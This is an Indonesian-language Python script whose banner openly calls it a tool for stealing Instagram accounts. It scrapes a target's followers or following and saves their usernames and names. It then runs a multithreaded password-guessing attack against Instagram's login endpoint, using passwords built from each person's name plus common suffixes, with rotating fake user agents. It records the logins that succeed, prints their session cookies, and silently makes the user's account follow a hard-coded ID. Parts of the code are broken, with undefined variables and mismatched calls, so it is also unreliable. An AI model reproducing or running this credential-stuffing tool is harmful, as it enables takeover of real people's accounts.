try:
    import re
    import os
    import sys
    import json
    import bs4
    import uuid
    import hmac
    import hashlib
    import urllib
    import urllib.request
    import calendar
    import requests
    import random
    import datetime
    import time
    from time import sleep
    from datetime import datetime
    from concurrent.futures import ThreadPoolExecutor
    from requests.exceptions import ConnectionError
except ImportError as e:
   exit(f"\n module {e} error")

## import rich
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich import print as cetak
from rich.panel import Panel as nel
from rich.table import Table as me
from rich.table import Table as lipat
from rich.columns import Columns
from rich.console import Console as sol
console = Console()
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn

skrng = datetime.now().strftime("%d-%b-%Y")
day = datetime.now().strftime("%d-%b-%Y")
current_GMT = time.gmtime(time.time())
userid,success,checkpoint,loop,following=[],[],0,[],[]
id2=[]
dump=[]
ugen=[]
s = requests.Session()


try:
    # python 2
	urllib_quote_plus = urllib.quote
except:
    # python 3
	urllib_quote_plus = urllib.parse.quote_plus

B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
H = "\033[0;92m" # HIJAU
K = "\033[0;93m" #KUNING
M = '\x1b[1;91m' # MERAH
P = "\033[0m" # PUTIH

#------------------[ WARNA FOR RICH ]-------------------#
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

#------------------[ RANDOM COLOR RICH ]-------------------#
L1 = "[#875f5f]" # LIGHT
G1  = "[#ffd700]" # GOLD
M1  = "[#875fd7]" # MEDIUM GREEN
P1   = "[#FF00FF]" # PINK
W1  = "[#FFFFFF]" # WHITE
S1   = "[#87afff]" # SKY BLUE
O1   = "[#d78700]" # ORANGE3
O3   = "[#ff5fff]" # MEDIUM ORCH3

USN = "Mozilla/5.0 (Linux; Android 5.0.1; HUAWEI GRA-L09 Build/HUAWEIGRA-L09C150B196) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.1; 480dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)"
for x in range(1000):
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android 12; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX3195 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 wkbrowser 5.0.17 {str(rr(2111111,2999999))} js 5.1.1 newfocus lng=ru"
    empat  = f"Mozilla/5.0 (Linux; Android 9{str(rr(7,12))}; RMX1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    UserAgentss = str(rc([satu,dua,tiga,empat]))
    ugen.append(UserAgentss)
for xc in range(10000):
	rr = random.randint
	rc = random.choice
	dpi = ['133','320','515','160','640','240','120','800','480','225','768','216','1024']
	i_version = ['114.0.0.20.2','114.0.0.38.120','114.0.0.20.70','114.0.0.28.120','114.0.0.0.24','114.0.0.0.41']
	pxl_phone = ['623x1280','700x1245','800x1280','1080x2340','1320x2400','1242x2688']
	UserAgents1 = f"Instagram {str(rc(i_version))} Android (23/{str(rr(9,12))}; {str(rc(dpi))}dpi; {str(rc(pxl_phone))}; vivo; vivo Xplay5S; PD1516A; qcom; ru; 99640911)"
	UserAgents2 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; RMX3063 Build/QP1A.{str(rr(111111,199999))}.020; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,99))}.0.{str(rr(3500,3999))}.{str(rr(75,150))} Mobile Safari/537.36 Puffin/9.7.2.{str(rr(51111,59999))}AP"
	UserAgents3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,12))}; en-US; CPH2223 Build/RKQ1.201217.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3500,3999))}.{str(rr(75,150))} UCBrowser/{str(rr(7,13))}.4.0.{str(rr(1300,1999))} Mobile Safari/537.36"
	ugent = str(rc([UserAgents1, UserAgents2, UserAgents3]))
	ugen.append(ugent)

for xc in range(100):
	rr = random.randint
	rc = random.choice
	dpi = ['133','320','515','160','640','240','120','800','480','225','768','216','1024']
	device_realme1 = random.choice(["E500A_2019","E500A_2019","AW500","AW790","AWM501","AWM509","AWM533","AWM539","AWM561","AWM99","M300","Z9 PLUS","Nexus 5","Nexus 7","Nexus 5X","Nexus 6P","Nexus 6","meizu 17 Pro","m1 note","PRO 6 Plus"])
	device_realme2 = random.choice(["ATOM-108AM","ATOM-216AM","ATOM-216RK","noa_G1","noaXPowe","noa X2 Plus","E-tel09","E-tel i240","Fivo Lite","FIVO PLUS","ITELL K3500","ITELL K3500","ITELL K4700","K3102 WIFI","WTAB 709W","WTAB_714","WTAB 803 3G","WTAB 803 MINI 3G","WTAB 805","Zed Book G"])
	device_realme3 = random.choice(["SMART_G101","SMART_G102","SMART_G71","SMART_G81","SMART_G81H","SMART_L103_eea","SMART_L104_eea","SMART_L206","SMART_L20X","iGET SMART S70","iGET SMART S72","SMART_W10X_EEA","SMART_W202","SMART_W203","SMART_W20X","SMART_W8X","FIRE_Tab_6","INEW V3","QTab V3 PLUS","V3C"])
	device_realme4 = random.choice(["Infinix X666B","Infinix X6285","Infinix X665E","Infinix X6827","Infinix HOT 3","Invinix HOT 3 Pro","Infinix HOT 4","Infinix HOT 4 Lite","Infinix HOT 4 Pro","Infinix X559F","Infinix X559","Infinix","X606D","Infinix X608","Infinix X623","Infinix X624","Infinix X 625B","Infinix X650C","Infinix X655C","Infinix X682C","Infinix X659B","Infinix X689"])
	device_realme5 = random.choice(["SM-J120H","SM-J120F","SM-J120M","SM-J111M","SM-J111F","SM-J110H","SM-J110G","SM-J110F","SM-J110M","SM-J105H","SM-J105Y","SM-J105B","SM-J106H","SM-J106F","SM-J106B","SM-J106M","SM-J200F","SM-J200M"])
	device_realme6 = random.choice(["RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061"])
	device_realme7 = random.choice(["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C"]) 
	ugent = str(rc([device_realme1, device_realme2, device_realme3, device_realme4, device_realme5, device_realme6, device_realme7]))
	ugen.append(ugent)

def banner():
	try:cek_data = requests.get("http://ip-api.com/json/").json()
	except:cek_data = {'-'}
	try:Iplu = cek_data["query"]
	except:Iplu = {'-'}
	Meledak=[]
	prints(Panel.fit(f"[bold white]Script ini dibuat untuk have fun + maling akun ig dilarang keras membagikan atau shre script ini",style="bold green"))
	Meledak.append(Panel(f"[bold white]Author : Meledak X Cik",style="bold green"))
	Meledak.append(Panel(f"[bold white]ip adres : {Iplu}",style="bold green"))
	console.print(Columns(Meledak))
#------------------[ URL LOGIN ]-------------------#
def convert(xx, coki):
	for i in xx.split(','):
		link = s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username={}".format(i), headers = {"user-agent":USN}, cookies = {"cookie":coki}).json()
		data = link["data"]["user"]
	return data["id"]
	
def cook(self, tok, cok):
	try:
		head = {"Host": "i.instagram.com","content-length": "0","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',"x-ig-app-id": "1217981644879628","x-ig-www-claim": "hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03Dg7NV","sec-ch-ua-mobile": "?1","x-instagram-ajax": "1006447742","viewport-width": "360","content-type": "application/x-www-form-urlencoded","accept": "*/*","user-agent": USN, "x-asbd-id": "198387","save-data": "on","x-csrftoken": tok,"sec-ch-ua-platform": '"Android"',"origin": "https://www.instagram.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.instagram.com/","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5"}
		s.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("MzRlODBiNWFlZA=="), headers = head, cookies={"cookie":cok})
	except requests.ConnectionError:
		print(f" {H}•{N} {M}Koneksi Internet Anda Bermasalah")
		time.sleep(3);exit()

def cokionly():
	prints(Panel.fit(f"login menggunakan cookie, disarankan tidak menggunakan akun pribadi anda",width=80,padding=(0,2),style=f"bold green"))
	coki = input(f"{P}+_ masukan cookie : {H}")
	try:
		id = re.search('ds_user_id=(\d+)',str(coki)).group(1)
		po = s.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers={"user-agent":USN},cookies={"cookie":coki})
		xx = json.loads(po.text)['user']
		if "full_name" in str(xx):
			useri = xx["username"]
			nama = xx["user"]["full_name"]
			ngtd = re.search("csrftoken=(.*?);", str(coki)).group(1)
			#self.cook(ngtd, coki)
			user = open('data/.username','w').write(useri)
			kuki = open('data/.kukis.log','w').write(coki)
			prints(f'{P}+_ selamat datang {H}{useri}{P} cookie kamu valid')
			time.sleep(0.05)
			prints(Panel(f"{H2}tolong gunakan script ini dengan bijak ya :)\natas apapun yang terjadi admin tidak bertanggung jawab.",title=f"{M2}• {K2}• {H2}•{P2} INFORMASI {H2}• {K2}• {M2}•",width=80,padding=(0,9),style=f"bold green"))
			exit()
		elif "challenge_required" in str(xx):
			print(f" {H}•{N} {K}Akun Anda Terkena Checkpoint")
			time.sleep(3);cokionly()
		else:
			print(f" {H}•{N} {M}Cookie Invalid Silahkan Ganti Cookie")
			time.sleep(3);LoginCuyy()
	except (json.decoder.JSONDecodeError, KeyError, AttributeError):
		prints(f"{P}+_ cookie invalid silahkan masukan cookie lainnya")
		time.sleep(3)
		os.system("rm -f data/.kukis.log & rm -f data/.username")
		exit()
	except ConnectionAbortedError:
		prints(f"{P}+_ koneksi internet anda bermasalah")
		time.sleep(3)
		exit()

class instagram:
	def __init__(self):
		s=requests.Session()
		self.menu() 
	def menu(self):
		try:
			coki = open("data/.kukis.log", "r").read()
			user = re.search('ds_user_id=(\d+)',str(coki)).group(1)
		except FileNotFoundError:
			cokionly()
		try:
			xxxx = self.ses.get(f"https://i.instagram.com/api/v1/users/{user}/info/", headers={"user-agent":USN}, cookies={"cookie":coki}).json()["user"]
			nama = xxxx["full_name"]
			user = xxxx["username"]
			flow = xxxx["follower_count"]
			flos = xxxx["following_count"]
		except (json.decoder.JSONDecodeError, KeyError, AttributeError, TypeError):
			print(f" {H}•{N} {M}Opsh Akun Tumbal Terkena Chekpoint")
			os.system("rm -f data/.kukis.log & rm -f data/.username");time.sleep(3);
			prints(Panel.fit(f"1. Login via cookie \n2. Login via user & pw"))
			i = input("pilihan anda : ") 
			if i in ["1"]:
				cokionly()
			else:
				namapw() 
		except requests.ConnectionError:
			print(f" {H}•{N} {M}Koneksi Internet Anda Bermasalah")
			time.sleep(3);exit()
		Meledak = f"[bold white]1\n2"
		Meledak2 = f"[bold white]Dump name instagram\nkeluar tools"
		Meledak3 = f"[bold white]ON\nON"
		Cik = lipat()
		Cik.add_column(f"[bold white]NO",justify="center")
		Cik.add_column(f"[bold white]MENU",justify="center",width=52)
		Cik.add_column(f"[bold white]STATUS",justify="center")
		Cik.add_row(Meledak,Meledak2,Meledak3,style="bold green")
		console.print(Cik,justify="left",style=f"bold green")
		c = input(f'└──╭➣ Pilih 1 Sampai 4 : ')
		if c=='':prints(Panel(f"{P2}Pilih Yang Bener Broo Jangan Kosong !",width=80,padding=(0,19),style=f"bold green"));time.sleep(3);exit()
		elif c in ("1"): dump()
		elif c in ('2'): self.Exit() 
		else: self.menu()
		
			
	def Exit(self):
		x=input(f"└──╭➣  Apakah Anda Yakin Ingin Keluar? Y/t : ")
		if x in ["y","Y"]:os.system("rm -f data/.kukis.log & rm -f data/.username");prints(Panel(f"{P2}Succeed Menghapus [bold green]'Cookie' {P2}Terima Kasih Telah Menggunakan Script Dump Meledak",width=80,padding=(0,2),style=f"bold green"));time.sleep(2);exit()
		elif x in ["t","T"]:exit()
		else:self.Exit()
		
class dump:
	def __init__(self):
		ses = requests.Session()
		cookie = {'cookie':open('data/.kukis.log','r').read()}
		username  = open('data/.username','r').read()
		self.main()
	
	def main(self, cookie):
		prints(Panel.fit(f"1. Dump via pengikut \n2. Dump via mengikuti")) 
		b = input("+_ pilihan anda : ") 
		if b in ["1"]:
			prints(Panel(f"{P2}Pastikan Username Target Yang Di Pilih Bersifat Publik Dan Jangan Private",width=80,style=f"bold green"))
			m =  input(f'└──╭➣ Username Target : ')
			print(f"└──╭➣ Wait Collect Username {m}")
			try:
				xzxz = convert(m, cookie)
				prints(Panel.fit(f"{P2}Proses Dump Username Tekan {color_rich}CTRL + C{P2} Untuk Berhenti",width=80,padding=(0,4),style=f"bold green"))
				self.masuk(xzxz, cookie, "followers", "")
			except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				print(f" {H}•{N} Koneksi Internet Anda Bermasalah")
				time.sleep(3);exit()
			except (KeyError, UnboundLocalError):
				prints(Panel(f"{M2}Gagal Mengambil Username, Kemungkinan Akun Target Private Bukan Publik",width=80,padding=(0,4),style=f"bold green"));exit()
		elif b in ["2"]:
			prints(Panel(f"{P2}Pastikan Username Target Yang Di Pilih Bersifat Publik Dan Jangan Private",width=80,style=f"bold green"))
			m =  input(f'└──╭➣ Username Target : ')
			print(f"└──╭➣ Wait Collect Username {m}")
			try:
				xzxz = convert(m, cookie)
				prints(Panel.fit(f"{P2}Proses Dump Username Tekan {color_rich}CTRL + C{P2} Untuk Berhenti",width=80,padding=(0,4),style=f"bold green"))
				self.masuk2(xzxz, cookie, "followers", "")
			except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				print(f" {H}•{N} Koneksi Internet Anda Bermasalah")
				time.sleep(3);exit()
			except (KeyError, UnboundLocalError):
				prints(Panel(f"{M2}Gagal Mengambil Username, Kemungkinan Akun Target Private Bukan Publik",width=80,padding=(0,4),style=f"bold green"));exit()
		else:
			exit() 
		simpan_file()
		
	def masuk(self, uid, cookie, kos):
		try:
			xxx = s.get(f"https://i.instagram.com/api/v1/friendships/{uid}/following/?count=100&max_id={kos}", headers={"user-agent":USN}, cookies={"cookie": cok})
			for x in json.loads(xxx.text)["users"]:
				if x["username"] in userid:
					continue
				userid.append(x["username"]+"|"+x["full_name"])
				sys.stdout.write(f"\r {H}<>{P} Proses Mengumpulkan {H}{len(userid)}{N} Username");sys.stdout.flush()
			if "next_max_id" in json.loads(xxx.text):
				self.masuk(uid, cookie, json.loads(xxx.text)["next_max_id"])
		except:pass
		
	def masuk2(self, uid, cookie, kos):
		try:
			xxx = s.get(f"https://i.instagram.com/api/v1/friendships/{uid}/followers/?count=100&max_id={kos}", headers={"user-agent":USN}, cookies={"cookie": cok})
			for x in json.loads(xxx.text)["users"]:
				if x["username"] in userid:
					continue
				userid.append(x["username"]+"|"+x["full_name"])
				sys.stdout.write(f"\r {H}<>{P} Proses Mengumpulkan {H}{len(userid)}{N} Username");sys.stdout.flush()
			if "next_max_id" in json.loads(xxx.text):
				self.masuk2(uid, cookie, json.loads(xxx.text)["next_max_id"])
		except:pass
		

class simpan_file:
	def __init__(self):
		self.main()
	def main(self):
		print('')
		ty = input('Simpan File? [y/t] : ').lower()
		if ty in ['1','01','y','ya','iya']: self.main2()
		else: pass
		
	def main2(self):
		try:os.mkdir('dump')
		except:pass
		try:
			nm  = input('Tulis Nama File : ').replace(' ','_') + '.txt'
			lk  = input('Tulis Lokasi Penyimpanan : ')
			lok = '%s\%s'%(lk,nm)
			open(lok,'a+')
			for d in userid:
				try: open(lok,'a+').write(d+'\n')
				except Exception as e: pass
				print('\nFile Dump Tersimpan Di %s'%(lok))
		except Exception as e:
			print('\nGagal Menemukan Lokasi File')
			lok = 'dump/%s.txt'%(day)
			open(lok,'a+')
			for d in userid:
				try: open(lok,'a+').write(d+'\n')
				except Exception as e: pass
				print('File Dump Tersimpan Di %s'%(lok))
				
class Menumasuk:
	def __init__(self):
		self.masuk() 
	def masuk(self):
		os.system('clear') 
		banner()
		Meledak = f"[bold white]1\n2\n3"
		Meledak2 = f"[bold white]Dump name instagram\ncrack file instagram\nkeluar tools"
		Meledak3 = f"[bold white]ON\nON\nON"
		Cik = lipat()
		Cik.add_column(f"[bold white]NO",justify="center")
		Cik.add_column(f"[bold white]MENU",justify="center",width=52)
		Cik.add_column(f"[bold white]STATUS",justify="center")
		Cik.add_row(Meledak,Meledak2,Meledak3,style="bold green")
		console.print(Cik,justify="left",style=f"bold green")
		c = input(f'└──╭➣ Pilih 1 Sampai 4 : ')
		if c=='':prints(Panel(f"{P2}Pilih Yang Bener Broo Jangan Kosong !",width=80,padding=(0,19),style=f"bold green"));time.sleep(3);exit()
		elif c in ("1"): instagram()
		elif c in ('2'): crackfile()
		elif c in ('3'): self.Exit() 
		else: self.masuk()


class crackfile:
	def __init__(self):
		self.masuk() 
	def masuk(self):
		print("") 
		dirs = os.listdir('dump')
		print ("[ pilih hasil crack yg tersimpan untuk krek file ]\n") 
		for file in dirs:
			print("{file}") 
		file = input(f'Masukan nama file  : ')
		try:
			uuid = open(file,'r').readlines()
			for data in uuid:
				try:user,nama = data.split('|')
				except:exit(f"pemisah id salah ")
				dump.append(data)
				print('sedang dump : [ %s ] id'%(len(dump)),end=" ")
				time.sleep(0.0000003)
		except FileNotFoundError:exit(f"File Tidak Terbaca")
		print(f'total jumlah akun dump adalah {len(dump)}')
		self.sandi()
		
	def sandi(self):
		Kawancik = f"{H2}01\n02\n03\np4"
		Kawancik2 = f"{P2}Password from script [ 123 - 1234 ]\nPassword from script [ 123 - 1234 - 12345 ]\nPassword gabungan full item\nPassword manual + from script"
		Kawancik3 = f"{H2}ON\nON\nON\nON"
		Kawanhir = me()
		Kawanhir.add_column(f"{P2}NO", style=f"bold blue", justify='center')
		Kawanhir.add_column(f"{P2}PASS", style=f"bold blue", justify='center',width=70)
		Kawanhir.add_column(f"{P2}STATUS", style=f"bold blue", justify='center')
		Kawanhir.add_row(Kawancik,Kawancik2, Kawancik3)
		console.print(Kawanhir, justify='left',style=f"bold green")
		pwplus = input("+_ Masukan pilihan : ")
		if pwplus == "1":
			self.babi(pwplus) 
		elif pwplus == "2":
			self.babi(pwplus) 
		elif pwplus == "3":
			self.babi(pwplus) 
		elif pwplus == "4":
			prints(Panel(f"{P2}Masukan Password Manual Minimal Password 6 Karakter Jangan Sampe Kurang\nContoh Password : sayang,sayang123,indonesia,rahasia,farz123",width=80,style=f"bold green"))
			zx = input(f'└──╭➣ Masukan Password : ')
			self.babi(pwplus,zx)
		else:
			self.babi() 
			
	def babi(self,o,zx=''):
		global prog,des,loop
		print("") 
		loop+=len(id2)
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		des = prog.add_task('',total=len(id2))
		with prog:
			with tred(max_workers=30) as pool:
				for i in id2:
					try:
						username=i.split("|")[0]
						password=i.split("|")[1].lower()
						for w in password.split(" "):
							if len(w)<3:
								continue
							else:
								w=w.lower()
								if o=="1":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234']
									else:
										sandi=[w,w+'123',w+'1234']
								elif o=="2":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'12345']
									else:
										sandi=[w,w+'123',w+'1234',w+'12345', password.lower()]
								elif o=="3":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
									else:
										sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
								elif o=="4":
									if len(zx) > 3:
										sandi = zx.replace(" ", "").split(",")
									else:
										break
								shinkai.submit(self.crackAPI,username,sandi)
					except:pass
			prints(Panel.fit(f" crack telah selesai maaf gk ada  penyimpanan result")) 
			
	def crackAPI(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		ua = random.choice(ugen) 
		prog.update(des,description=f"{H2}Stabil{P2} {loop}/{len(id2)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
		prog.advance(des)
		try:
			for pw in pas:
				xyaa_code=random.randint(1000000000, 99999999999)
				ts = calendar.timegm(current_GMT)
				p = ses.get(str(random.choice([
				      "https://www.secure.instagram.com/accounts/login/",
				      "https://www.secure.instagram.com/accounts/login/?force_classic_login=&",
				      "https://www.secure.instagram.com/accounts/login/?force_classic_login&hl=en",
				      "https://www.secure.instagram.com/accounts/onetap/",
				      "https://www.secure.instagram.com/accounts/onetap/?next=%2F",
				      "https://www.secure.instagram.com/accounts/onetap/?next=/"
				      ])))
				head = {
                    'Host': 'www.secure.instagram.com',
                    'Connection': 'keep-alive',
                    'Content-Length': '314',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                    'X-IG-App-ID': '1217981644879628',
                    'X-IG-WWW-Claim': '0',
                    'sec-ch-ua-mobile': '?1',
                    'X-Instagram-AJAX': '8a5016770d5c',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': '*/*',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-ASBD-ID': '198387',
                    'User-Agent': ua, 
                    'X-CSRFToken': p.cookies['csrftoken'],
                    'sec-ch-ua-platform': '"Android"',
                    'Origin': 'https://www.secure.instagram.com',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Referer': 'https://www.secure.instagram.com/',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
				data = {
				    "enc_password": f"#PWD_INSTAGRAM_BROWSER:5:{ts}:{pw}",
				    "username": user,
				    "queryParams": "{}",
				    "optIntoOneTap": 'false',
				    "stopDeletionNonce": "",
				    "trustedDeviceRecords": "{}"}
				respon = ses.post("https://www.secure.instagram.com/accounts/login/ajax/", headers = head, data = data, allow_redirects = False)
				Meledak = json.loads(respon.text)
				if 'userId' in Meledak or "logged_in_user" in Meledak or "sessionid" in ses.cookies.get_dict():
					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					Meledak = Tree(Panel.fit(f"[bold green]Login Successfully[bold white]",style="bold blue"))
					Meledak.add(Panel.fit(f"[bold green]{user} | {pw} [bold white]",style="bold blue"))
					Meledak.add(Panel.fit(f"[bold green]{cookie}[bold white]",style="bold blue"))
					Meledak.add(Panel.fit(f"[bold green]{ua} [bold white]",style="bold blue"))
					prints(Meledak)
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break
				elif 'checkpoint_url' in Meledak or "https://www.secure.instagram.com/challenge" in Meledak or 'href="https://www.instagram.com/challenge/action/"' in Meledak:
					Meledak = Tree(Panel.fit(f"[bold yellow]Login checkpoint[bold white]",style="bold red"))
					Meledak.add(Panel.fit(f"[bold yellow]{user} | {pw} [bold white]",style="bold red")) 
					Meledak.add(Panel.fit(f"[bold yellow]{ua}[bold white]",style="bold red"))
					prints(Meledak)
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				else:
					continue
			loop+=1
		except requests.ConnectionError:
			time.sleep(10)
		

if __name__ == '__main__':
	try:os.mkdir('data')
	except:pass
	try:os.mkdir('dump')
	except:pass
	try:os.system('result')
	except:pass
	os.system("git pull")
	Menumasuk() 
		